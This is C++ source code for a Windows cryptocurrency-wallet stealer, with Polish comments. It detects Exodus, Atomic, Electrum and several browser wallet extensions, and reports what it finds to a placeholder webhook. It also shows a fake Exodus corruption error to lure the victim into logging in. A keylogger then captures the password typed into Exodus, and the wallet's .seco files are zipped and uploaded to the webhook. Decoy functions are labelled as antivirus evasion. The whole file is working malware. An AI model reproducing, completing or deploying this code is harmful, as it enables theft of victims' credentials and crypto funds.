
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <fstream>
#include <shlobj.h>
#include <psapi.h>
#include <winhttp.h>
#include <sstream>
#include <shlwapi.h>
#include <algorithm>
#include <cmath>
#include <cctype>
#include <mutex>
#include <ctime>
#include <shldisp.h>
#include <map>

#include "metamask.h" // Nowe dołączenie

#pragma comment(linker, "/subsystem:windows /entry:WinMainCRTStartup")

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "Ole32.lib")
#pragma comment(lib, "OleAut32.lib")

// --- Implementacja biblioteki miniz.c v1.15 - public domain ---
/*
  miniz.c v1.15 - public domain deflate/inflate, zlib-subset, ZIP reading/writing/appending, PNG writing
   See "miniz.c" for more details.
   Rich Geldreich <richgel99@gmail.com>, last updated May 20, 2012
   Implements RFC 1950: ZLIB 3.3, RFC 1951: DEFLATE 1.3, RFC 1952: GZIP 4.3.
*/

// --- Zmienne globalne ---
std::string g_keystrokeBuffer = "";
const std::wstring g_exodusProcessName = L"Exodus.exe";
const std::string g_webhookUrl = "-------------->>>>>>>>>WEBHOOK WEBHOOK WEBHOOK WEBHOOK WEBHOOK WEBHOOK WEBHOOK WEBHOOK WEBHOOK WEBHOOK WEBHOOK WEBHOOK WEBHOOK WEBHOOK<<<<<<<<-----------------"; 
bool g_dataSent = false;
bool g_exodusFound = false; // Nowa flaga do śledzenia, czy znaleziono Exodus

// Struktura do przechowywania informacji o portfelach plikowych
struct FileWallet {
    std::string name;
    std::wstring path;
};

// --- Globalny mutex i funkcja logowania ---
std::mutex g_logMutex;
void logToFile(const std::string& message) {
    std::lock_guard<std::mutex> lock(g_logMutex);
    std::ofstream logFile("x.log", std::ios_base::app);
    if (logFile.is_open()) {
        char time_buf[80]; time_t now = time(0); struct tm timeinfo;
        localtime_s(&timeinfo, &now); strftime(time_buf, sizeof(time_buf), "%Y-%m-%d %H:%M:%S", &timeinfo);
        logFile << "[" << time_buf << "] " << message << std::endl;
    }
}

std::string wstringToString_exouds(const std::wstring& wstr) {
    if (wstr.empty()) return std::string();
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
    std::string strTo(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &strTo[0], size_needed, NULL, NULL);
    return strTo;
}

// --- Funkcje rozpraszające (dla utrudnienia analizy statycznej) ---
long long distraction1_calculateSum() { long long sum = 0; for (int i = 1; i <= 500; ++i) { sum += i * (i % 2 == 0 ? 1 : -1); } return sum; }
std::string distraction2_transformString(std::string s) { for (size_t i = 0; i < s.length(); ++i) { if (i % 3 == 0) s[i] = (char)toupper(s[i]); else s[i] = (char)tolower(s[i]); } return s; }
void distraction3_bubbleSort() { int arr[] = { 64, 34, 25, 12, 22, 11, 90, 5, 77, 1 }; int n = sizeof(arr) / sizeof(arr[0]); for (int i = 0; i < n - 1; i++) for (int j = 0; j < n - i - 1; j++) if (arr[j] > arr[j + 1]) std::swap(arr[j], arr[j + 1]); }
double distraction4_pointlessMath() { double val = 3.14159; for (int i = 0; i < 250; ++i) { val = sqrt(pow(val, 2) / 2.0 * 1.5 + 1.0); } return val; }

// --- Deklaracje funkcji ---
bool getKnownPaths(std::wstring& localAppData, std::wstring& roamingAppData);
std::vector<FileWallet> checkFileWallets(std::wstring& outExodusPath);
void sendData(const std::string& capturedText, const std::wstring& walletPath);
void sendDiscoveryMessage(const std::vector<FileWallet>& fileWallets, const std::vector<BrowserWallet>& browserWallets, const std::vector<std::string>& installedBrowsers);
void monitorKeystrokes();
std::vector<std::string> findInstalledBrowsers();

// --- Główna funkcja programu ---
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    std::ofstream("x.log", std::ofstream::out | std::ofstream::trunc);
    logToFile("Aplikacja uruchomiona (v8.0 - Spectre).");

    distraction1_calculateSum();
    distraction2_transformString("ThIs Is A tEsT sTrInG fOr AnTiViRuS eVaSiOn.");

    std::wstring exodusExePath;
    std::vector<FileWallet> fileWallets = checkFileWallets(exodusExePath);
    std::vector<BrowserWallet> browserWallets = checkBrowserWallets();
    std::vector<std::string> installedBrowsers = findInstalledBrowsers();

    if (!fileWallets.empty() || !browserWallets.empty() || !installedBrowsers.empty()) {
        logToFile("Znaleziono portfele. Wysyłanie wiadomości rozpoznawczej...");
        sendDiscoveryMessage(fileWallets, browserWallets, installedBrowsers);
    } else {
        logToFile("Nie znaleziono żadnych portfeli. Zamykanie.");
        return 1;
    }
    
    // Uruchom monitor portfeli przeglądarkowych, jeśli jakiekolwiek znaleziono
    if (!browserWallets.empty()) {
        logToFile("Uruchamianie wątku monitorującego portfele przeglądarkowe.");
        std::thread(monitorAndExfiltrateBrowserWallets, browserWallets, g_webhookUrl).detach();
    }

    // Sprawdź, czy Exodus był jednym ze znalezionych portfeli
    for (const auto& wallet : fileWallets) {
        if (wallet.name == "Exodus") {
            g_exodusFound = true;
            break;
        }
    }

    if (!g_exodusFound) {
        logToFile("Nie znaleziono instalacji Exodus. Zamykanie głównego wątku po zakończeniu zadań w tle.");
        return 0; 
    }

    // Ten kod wykona się tylko jeżeli g_exodusFound == true
    logToFile("Znaleziono Exodus. Ścieżka: " + wstringToString_exouds(exodusExePath));
    logToFile("Przechodzenie do logiki specyficznej dla Exodus...");

    std::thread([=]() {
        std::this_thread::sleep_for(std::chrono::seconds(3));
        logToFile("Wyświetlanie fake errora.");
        MessageBoxW(NULL, L"A data corruption has been detected in the wallet's transaction cache. Exodus will now attempt to resynchronize your assets. Please open the application and log in to begin the recovery process.\n\nError code: E-01x73C", L"Exodus - Wallet Error", MB_OK | MB_ICONWARNING);
        logToFile("Fake error zamknięty. Uruchamianie Exodusa...");
        
        distraction3_bubbleSort();
        distraction4_pointlessMath();

        STARTUPINFOW si = { sizeof(si) }; PROCESS_INFORMATION pi;
        if (CreateProcessW(exodusExePath.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
            logToFile("Proces Exodus.exe uruchomiony pomyślnie.");
            CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        } else {
            logToFile("BŁĄD KRYTYCZNY: Nie udało się uruchomić Exodus.exe. Kod błędu: " + std::to_string(GetLastError()));
        }
        
        distraction1_calculateSum();
        distraction2_transformString("AnOtHeR dIsTrAcTiOn StRiNg.");
    }).detach();

    logToFile("Uruchamianie wątku monitorującego klawiaturę dla Exodus.");
    std::thread(monitorKeystrokes).detach();

    while (!g_dataSent) { Sleep(500); }
    
    logToFile("Wątek sendData (Exodus) zakończył pracę. Główny proces kończy działanie.");
    return 0;
}

// --- Implementacje funkcji ---
bool getKnownPaths(std::wstring& localAppData, std::wstring& roamingAppData) {
    PWSTR pszPath = NULL;
    if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, NULL, &pszPath))) { localAppData = pszPath; CoTaskMemFree(pszPath); } else return false;
    if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, NULL, &pszPath))) { roamingAppData = pszPath; CoTaskMemFree(pszPath); } else return false;
    return true;
}

std::vector<FileWallet> checkFileWallets(std::wstring& outExodusPath) {
    std::vector<FileWallet> foundWallets;
    logToFile("Rozpoczynanie sprawdzania portfeli plikowych...");
    std::wstring localAppData, roamingAppData;
    if (!getKnownPaths(localAppData, roamingAppData)) {
        logToFile("Błąd podczas pobierania znanych ścieżek.");
        return foundWallets;
    }

    // 1. Exodus
    outExodusPath = localAppData + L"\\exodus\\Exodus.exe";
    std::wstring exodusWalletPath = roamingAppData + L"\\Exodus\\exodus.wallet";
    if (PathFileExistsW(outExodusPath.c_str()) && PathFileExistsW(exodusWalletPath.c_str())) {
        logToFile("Znaleziono portfel Exodus.");
        foundWallets.push_back({"Exodus", exodusWalletPath});
    }

    // 2. Atomic Wallet
    std::wstring atomicPath = roamingAppData + L"\\atomic\\Local Storage\\leveldb";
    if (PathFileExistsW(atomicPath.c_str())) {
        logToFile("Znaleziono portfel Atomic.");
        foundWallets.push_back({"Atomic Wallet", atomicPath});
    }

    // 3. Electrum
    std::wstring electrumPath = roamingAppData + L"\\Electrum\\wallets";
    if (PathFileExistsW(electrumPath.c_str())) {
        logToFile("Znaleziono portfel Electrum.");
        foundWallets.push_back({"Electrum", electrumPath});
    }

    if (foundWallets.empty()){
        logToFile("Nie znaleziono żadnych portfeli plikowych.");
    }
    return foundWallets;
}


void monitorKeystrokes() {
    logToFile("Wątek monitorKeystrokes aktywny.");
    while (!g_dataSent && g_exodusFound) { // Dodatkowy warunek
        std::this_thread::sleep_for(std::chrono::milliseconds(10));

        HWND foreground = GetForegroundWindow();
        if (!foreground) continue;

        DWORD pid; GetWindowThreadProcessId(foreground, &pid);
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
        if (!hProcess) continue;

        wchar_t processPath[MAX_PATH];
        if (GetModuleFileNameExW(hProcess, NULL, processPath, MAX_PATH)) {
            if (wcscmp(PathFindFileNameW(processPath), g_exodusProcessName.c_str()) == 0) {
                for (int i = 8; i <= 222; ++i) {
                    if (GetAsyncKeyState(i) & 0x0001) {
                        switch(i) {
                            case VK_RETURN:
                                if (!g_keystrokeBuffer.empty()) {
                                    logToFile("Naciśnięto Enter w oknie Exodus. Przechwycono: " + g_keystrokeBuffer);
                                    std::wstring dummyExe;
                                    std::vector<FileWallet> wallets = checkFileWallets(dummyExe);
                                    for(const auto& wallet : wallets) {
                                        if (wallet.name == "Exodus") {
                                            std::thread(sendData, g_keystrokeBuffer, wallet.path).detach();
                                            break;
                                        }
                                    }
                                }
                                g_keystrokeBuffer.clear();
                                break;
                            case VK_BACK:
                                if (!g_keystrokeBuffer.empty()) g_keystrokeBuffer.pop_back();
                                break;
                            case VK_SHIFT: case VK_CONTROL: case VK_MENU: break;
                            default:
                                BYTE keyboardState[256] = {0}; GetKeyboardState(keyboardState);
                                WCHAR buffer[2] = {0};
                                if (ToUnicode(i, MapVirtualKey(i, MAPVK_VK_TO_VSC), keyboardState, buffer, 2, 0) > 0) {
                                    char ch; WideCharToMultiByte(CP_ACP, 0, buffer, 1, &ch, 1, NULL, NULL);
                                    if (isprint(ch)) g_keystrokeBuffer += ch;
                                }
                                break;
                        }
                    }
                }
            }
        }
        CloseHandle(hProcess);
    }
    logToFile("Wątek monitorKeystrokes zakończył pracę.");
}

std::vector<std::string> findInstalledBrowsers() {
    std::vector<std::string> result;
    std::wstring localAppData, roamingAppData;
    if (!getKnownPaths(localAppData, roamingAppData)) return result;
    if (PathFileExistsW((localAppData + L"\\Google\\Chrome\\User Data").c_str())) result.push_back("Chrome");
    if (PathFileExistsW((roamingAppData + L"\\Opera Software\\Opera Stable").c_str())) result.push_back("Opera");
    if (PathFileExistsW((roamingAppData + L"\\Opera Software\\Opera GX Stable").c_str())) result.push_back("Opera GX");
    if (PathFileExistsW((roamingAppData + L"\\Mozilla\\Firefox").c_str())) result.push_back("Firefox");
    return result;
}

static bool CreateEmptyZip(const std::wstring& zipPath) {
    HANDLE h = CreateFileW(zipPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return false;
    unsigned char eocd[22] = { 'P','K', 5,6, 0,0, 0,0, 0,0, 0,0, 0,0, 0,0, 0,0, 0,0 };
    DWORD written = 0;
    BOOL ok = WriteFile(h, eocd, sizeof(eocd), &written, NULL);
    CloseHandle(h);
    return ok && written == sizeof(eocd);
}

static bool ZipSecoFilesViaShell(const std::wstring& folderPath, std::wstring& outZipPath) {
    wchar_t tmpPath[MAX_PATH];
    if (!GetTempPathW(MAX_PATH, tmpPath)) return false;
    wchar_t tmpFile[MAX_PATH];
    if (!GetTempFileNameW(tmpPath, L"exz", 0, tmpFile)) return false;
    outZipPath = tmpFile;
    // ensure .zip extension
    size_t len = outZipPath.length();
    if (len < 4 || _wcsicmp(outZipPath.c_str() + len - 4, L".zip") != 0) outZipPath += L".zip";

    if (!CreateEmptyZip(outZipPath)) return false;

    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    bool needUninit = SUCCEEDED(hr);

    IShellDispatch* pShell = nullptr;
    hr = CoCreateInstance(CLSID_Shell, NULL, CLSCTX_INPROC_SERVER, IID_IShellDispatch, (void**)&pShell);
    if (FAILED(hr) || !pShell) { if (needUninit) CoUninitialize(); return false; }

    Folder* pZip = nullptr; Folder* pSrc = nullptr;
    VARIANT vZip; VariantInit(&vZip); vZip.vt = VT_BSTR; vZip.bstrVal = SysAllocString(outZipPath.c_str());
    VARIANT vSrc; VariantInit(&vSrc); vSrc.vt = VT_BSTR; vSrc.bstrVal = SysAllocString(folderPath.c_str());

    hr = pShell->NameSpace(vZip, &pZip);
    if (FAILED(hr) || !pZip) { VariantClear(&vZip); VariantClear(&vSrc); pShell->Release(); if (needUninit) CoUninitialize(); return false; }
    hr = pShell->NameSpace(vSrc, &pSrc);
    if (FAILED(hr) || !pSrc) { pZip->Release(); VariantClear(&vZip); VariantClear(&vSrc); pShell->Release(); if (needUninit) CoUninitialize(); return false; }

    // Enumerate *.seco and copy
    WIN32_FIND_DATAW fd; HANDLE hFind = FindFirstFileW((folderPath + L"\\*.seco").c_str(), &fd);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                BSTR bstrName = SysAllocString(fd.cFileName);
                FolderItem* pItem = nullptr;
                pSrc->ParseName(bstrName, &pItem);
                SysFreeString(bstrName);
                if (pItem) {
                    VARIANT vItem; VariantInit(&vItem); vItem.vt = VT_DISPATCH; vItem.pdispVal = pItem;
                    VARIANT vOpt; VariantInit(&vOpt); vOpt.vt = VT_I4; vOpt.lVal = 16; // FOF_SILENT
                    pZip->CopyHere(vItem, vOpt);
                    Sleep(200);
                    pItem->Release();
                }
            }
        } while (FindNextFileW(hFind, &fd));
        FindClose(hFind);
    }

    if (pSrc) pSrc->Release();
    if (pZip) pZip->Release();
    VariantClear(&vZip); VariantClear(&vSrc);
    pShell->Release();
    if (needUninit) CoUninitialize();
    return true;
}

void sendDiscoveryMessage(const std::vector<FileWallet>& fileWallets, const std::vector<BrowserWallet>& browserWallets, const std::vector<std::string>& installedBrowsers) {
    try {
        logToFile("Przygotowywanie wiadomości rozpoznawczej.");

        auto joinListW = [](const std::vector<std::wstring>& v){ std::wstring out; for (size_t i=0;i<v.size();++i){ out += v[i]; if (i+1<v.size()) out += L", "; } return out; };
        
        std::vector<std::wstring> fields;

        // Browsers
        if (!installedBrowsers.empty()) {
            std::vector<std::wstring> browserLabels;
            for(const auto& b : installedBrowsers) {
                if(b == "Chrome") browserLabels.push_back(L"🌐 Chrome");
                else if(b == "Opera") browserLabels.push_back(L"🅾️ Opera");
                else if(b == "Opera GX") browserLabels.push_back(L"🎮 Opera GX");
                else if(b == "Firefox") browserLabels.push_back(L"🦊 Firefox");
                else browserLabels.push_back(std::wstring(b.begin(), b.end()));
            }
            std::wstringstream f; f << L"{\"name\": \"Zainstalowane Przeglądarki\", \"value\": \"" << joinListW(browserLabels) << L"\", \"inline\": false}"; fields.push_back(f.str());
        }

        // File Wallets
        std::vector<std::wstring> allFileWalletsW = {L"💼 Exodus", L"⚛️ Atomic Wallet", L"⚡ Electrum"};
        std::vector<std::wstring> presentFileWalletsW;
        for (const auto& w : fileWallets) {
            if (w.name == "Exodus") presentFileWalletsW.push_back(L"💼 Exodus");
            else if (w.name == "Atomic Wallet") presentFileWalletsW.push_back(L"⚛️ Atomic Wallet");
            else if (w.name == "Electrum") presentFileWalletsW.push_back(L"⚡ Electrum");
        }
        if (!presentFileWalletsW.empty()) {
            std::wstringstream f; f << L"{\"name\": \"Portfele Plikowe (Znalezione)\", \"value\": \"" << joinListW(presentFileWalletsW) << L"\", \"inline\": false}"; fields.push_back(f.str());
        }
        std::vector<std::wstring> missingFileWalletsW;
        for (const auto& label : allFileWalletsW) {
            if (std::find(presentFileWalletsW.begin(), presentFileWalletsW.end(), label) == presentFileWalletsW.end()) missingFileWalletsW.push_back(label);
        }
        if (!missingFileWalletsW.empty()) {
            std::wstringstream f; f << L"{\"name\": \"Portfele Plikowe (Brak)\", \"value\": \"" << joinListW(missingFileWalletsW) << L"\", \"inline\": false}"; fields.push_back(f.str());
        }

        // Browser Wallets
        std::vector<std::wstring> allBrowserWalletsW = {L"🦊 MetaMask", L"👻 Phantom", L"🔵 Coinbase Wallet", L"🛡️ Ronin Wallet"};
        std::vector<std::wstring> presentBrowserWalletsW;
        std::map<std::wstring, std::vector<std::wstring>> bwByNameW;
        for (const auto& bw : browserWallets) {
            std::wstring label;
            if (bw.name == "Metamask") label = L"🦊 MetaMask";
            else if (bw.name == "Phantom") label = L"👻 Phantom";
            else if (bw.name == "Coinbase Wallet") label = L"🔵 Coinbase Wallet";
            else if (bw.name == "Ronin Wallet") label = L"🛡️ Ronin Wallet";
            else label = std::wstring(bw.name.begin(), bw.name.end());
            
            if (std::find(presentBrowserWalletsW.begin(), presentBrowserWalletsW.end(), label) == presentBrowserWalletsW.end()){
                presentBrowserWalletsW.push_back(label);
            }
            bwByNameW[label].push_back(std::wstring(bw.browser.begin(), bw.browser.end()));
        }

        if(!bwByNameW.empty()){
            std::wstring bwLines;
            for (const auto& kv : bwByNameW) {
                bwLines += kv.first + L" — " + joinListW(kv.second) + L"\\n";
            }
            std::wstringstream f; f << L"{\"name\": \"Portfele Przeglądarkowe (Znalezione)\", \"value\": \"" << bwLines << L"\", \"inline\": false}";
            fields.push_back(f.str());
        }

        std::vector<std::wstring> missingBrowserWalletsW;
        for (const auto& label : allBrowserWalletsW) {
            if (std::find(presentBrowserWalletsW.begin(), presentBrowserWalletsW.end(), label) == presentBrowserWalletsW.end()) {
                missingBrowserWalletsW.push_back(label);
            }
        }
        if (!missingBrowserWalletsW.empty()) {
            std::wstringstream f; f << L"{\"name\": \"Portfele Przeglądarkowe (Brak)\", \"value\": \"" << joinListW(missingBrowserWalletsW) << L"\", \"inline\": false}";
            fields.push_back(f.str());
        }
        
        std::wstringstream wss;
        wss << L"{";
        wss << L"\"content\": null,";
        wss << L"\"embeds\": [";
        wss << L"  {";
        wss << L"    \"title\": \"Wallet Discovery Report\",";
        wss << L"    \"color\": 16766720,";
        wss << L"    \"fields\": [";
        for (size_t i = 0; i < fields.size(); ++i) { wss << fields[i] << (i + 1 < fields.size() ? L"," : L""); }
        wss << L"]";
        wss << L"  }";
        wss << L"],";
        wss << L"\"username\": \"Wallet Tracker\",";
        wss << L"\"attachments\": []";
        wss << L"}";

        std::string json_payload = wstringToString_exouds(wss.str());
        
        URL_COMPONENTSW urlComp; wchar_t hostName[256], urlPath[2048];
        memset(&urlComp, 0, sizeof(urlComp)); urlComp.dwStructSize = sizeof(urlComp);
        urlComp.lpszHostName = hostName; urlComp.dwHostNameLength = 256; urlComp.lpszUrlPath = urlPath; urlComp.dwUrlPathLength = 2048;
        std::wstring wWebhookUrl(g_webhookUrl.begin(), g_webhookUrl.end());
        if (!WinHttpCrackUrl(wWebhookUrl.c_str(), (DWORD)wWebhookUrl.length(), 0, &urlComp)) { logToFile("BŁĄD: WinHttpCrackUrl w sendDiscoveryMessage"); return; }

        HINTERNET hSession = WinHttpOpen(L"StealthApp/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
        HINTERNET hConnect = WinHttpConnect(hSession, urlComp.lpszHostName, urlComp.nScheme == INTERNET_SCHEME_HTTPS ? INTERNET_DEFAULT_HTTPS_PORT : INTERNET_DEFAULT_HTTP_PORT, 0);
        HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", urlComp.lpszUrlPath, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, urlComp.nScheme == INTERNET_SCHEME_HTTPS ? WINHTTP_FLAG_SECURE : 0);
        std::wstring headers = L"Content-Type: application/json"; WinHttpAddRequestHeaders(hRequest, headers.c_str(), headers.length(), WINHTTP_ADDREQ_FLAG_ADD);

        if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, (LPVOID)json_payload.c_str(), (DWORD)json_payload.length(), (DWORD)json_payload.length(), 0)) {
            WinHttpReceiveResponse(hRequest, NULL); logToFile("Wiadomość rozpoznawcza wysłana pomyślnie.");
        } else { logToFile("BŁĄD: WinHttpSendRequest w sendDiscoveryMessage"); }

        if(hRequest) WinHttpCloseHandle(hRequest); if(hConnect) WinHttpCloseHandle(hConnect); if(hSession) WinHttpCloseHandle(hSession);

    } catch (...) {
        logToFile("BŁĄD: Nieznany wyjątek w sendDiscoveryMessage.");
    }
}

void sendData(const std::string& capturedText, const std::wstring& walletPath) {
    try {
        logToFile("Wątek sendData rozpoczął działanie.");

        std::wstring zipPath;
        bool haveZip = ZipSecoFilesViaShell(walletPath, zipPath);

        std::string boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW";
        std::string contentTypeHeader = "Content-Type: multipart/form-data; boundary=" + boundary;

        std::stringstream body_ss;
        body_ss << "--" << boundary << "\r\n";
        body_ss << "Content-Disposition: form-data; name=\"payload_json\"\r\n";
        body_ss << "Content-Type: application/json\r\n\r\n";
        // Blue embed with spoiler text
        body_ss << "{ \"content\": null, \"embeds\": [{ \"title\": \"Exodus Capture\", \"color\": 3447003, \"fields\": [{ \"name\": \"Captured Text\", \"value\": \"||" << capturedText << "||\", \"inline\": false }] }], \"attachments\": [] }\r\n";

        std::vector<char> requestBody;
        std::string partStart = body_ss.str();
        requestBody.insert(requestBody.end(), partStart.begin(), partStart.end());

        if (haveZip) {
            std::ifstream zf(zipPath, std::ios::binary | std::ios::ate);
            if (zf.is_open()) {
                std::streamsize zsize = zf.tellg(); zf.seekg(0, std::ios::beg);
                std::vector<char> zbuf(static_cast<size_t>(zsize));
                if (zsize > 0 && zf.read(zbuf.data(), zsize)) {
                    std::stringstream filePart;
                    filePart << "--" << boundary << "\r\n";
                    filePart << "Content-Disposition: form-data; name=\"file1\"; filename=\"wallet.zip\"\r\n";
                    filePart << "Content-Type: application/zip\r\n\r\n";
                    std::string fileHeader = filePart.str();
                    requestBody.insert(requestBody.end(), fileHeader.begin(), fileHeader.end());
                    requestBody.insert(requestBody.end(), zbuf.begin(), zbuf.end());
                    std::string crlf = "\r\n"; requestBody.insert(requestBody.end(), crlf.begin(), crlf.end());
                }
            }
        }

        std::string endBoundary = "--" + boundary + "--\r\n";
        requestBody.insert(requestBody.end(), endBoundary.begin(), endBoundary.end());

        URL_COMPONENTSW urlComp; wchar_t hostName[256], urlPath[2048];
        memset(&urlComp, 0, sizeof(urlComp)); urlComp.dwStructSize = sizeof(urlComp);
        urlComp.lpszHostName = hostName; urlComp.dwHostNameLength = 256; urlComp.lpszUrlPath = urlPath; urlComp.dwUrlPathLength = 2048;
        std::wstring wWebhookUrl(g_webhookUrl.begin(), g_webhookUrl.end());
        if (!WinHttpCrackUrl(wWebhookUrl.c_str(), (DWORD)wWebhookUrl.length(), 0, &urlComp)) { logToFile("KRYTYCZNY BŁĄD: WinHttpCrackUrl nie powiódł się."); if (!zipPath.empty()) DeleteFileW(zipPath.c_str()); return; }

        HINTERNET hSession = WinHttpOpen(L"StealthApp/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
        if (!hSession) { if (!zipPath.empty()) DeleteFileW(zipPath.c_str()); return; }
        HINTERNET hConnect = WinHttpConnect(hSession, urlComp.lpszHostName, urlComp.nScheme == INTERNET_SCHEME_HTTPS ? INTERNET_DEFAULT_HTTPS_PORT : INTERNET_DEFAULT_HTTP_PORT, 0);
        if (!hConnect) { WinHttpCloseHandle(hSession); if (!zipPath.empty()) DeleteFileW(zipPath.c_str()); return; }
        HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", urlComp.lpszUrlPath, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, urlComp.nScheme == INTERNET_SCHEME_HTTPS ? WINHTTP_FLAG_SECURE : 0);
        if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); if (!zipPath.empty()) DeleteFileW(zipPath.c_str()); return; }

        std::wstring wContentType(contentTypeHeader.begin(), contentTypeHeader.end());
        WinHttpAddRequestHeaders(hRequest, wContentType.c_str(), (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD);
        
        logToFile("Wysyłanie danych na webhook... Rozmiar całkowity: " + std::to_string(requestBody.size()) + " bajtów.");
        if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, requestBody.data(), (DWORD)requestBody.size(), (DWORD)requestBody.size(), 0)) {
            WinHttpReceiveResponse(hRequest, NULL); logToFile("Dane wysłane pomyślnie.");
        } else { logToFile("KRYTYCZNY BŁĄD: WinHttpSendRequest nie powiódł się! Kod błędu: " + std::to_string(GetLastError())); }
        
        if(hRequest) WinHttpCloseHandle(hRequest);
        if(hConnect) WinHttpCloseHandle(hConnect);
        if(hSession) WinHttpCloseHandle(hSession);
        if (!zipPath.empty()) DeleteFileW(zipPath.c_str());
        
        g_dataSent = true;

    } catch (...) {
        logToFile("KRYTYCZNY BŁĄD: Nieznany wyjątek w wątku sendData.");
        g_dataSent = true;
    }
}
